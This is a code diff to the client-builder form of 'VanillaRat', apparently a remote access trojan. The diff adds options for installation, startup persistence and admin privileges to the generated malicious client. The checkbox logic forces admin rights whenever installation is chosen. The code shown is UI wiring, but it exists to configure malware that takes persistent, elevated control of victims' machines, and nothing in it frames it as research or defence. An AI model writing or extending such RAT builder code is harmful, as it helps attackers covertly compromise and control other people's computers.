@@ -35,9 +35,35 @@ namespace VanillaRat.Forms
                 MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;                   
             }
-            ClientBuilder.BuildClient(txtPort.Text, txtDNS.Text, txtName.Text, txtClientTag.Text, txtInterval.Text);
+
+            string Install = "False";
+            string Admin = "False";
+            string Startup = "False";
+            Install = cbEnableInstallation.Checked ? "True" : "False";              
+            Startup = cbEnableStartup.Checked ? "True" : "False";      
+            Admin = cbEnableAdmin.Checked ? "True" : "False";
+
+
+            ClientBuilder.BuildClient(txtPort.Text, txtDNS.Text, txtName.Text, txtClientTag.Text, txtInterval.Text, Install, Startup, Admin);
             Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Clients\");
             Hide();
+        }
+
+        private void cbEnableInstallation_CheckedChanged(object sender, EventArgs e)
+        {
+            if (cbEnableInstallation.Checked)
+            {
+                cbEnableStartup.Enabled = true;
+                cbEnableAdmin.Checked = true;
+                cbEnableAdmin.Enabled = false;
+            }
+            else
+            {
+                if (!cbEnableAdmin.Enabled)
+                    cbEnableAdmin.Enabled = true;
+                cbEnableStartup.Enabled = false;
+            }
+            
         }
     }
 }
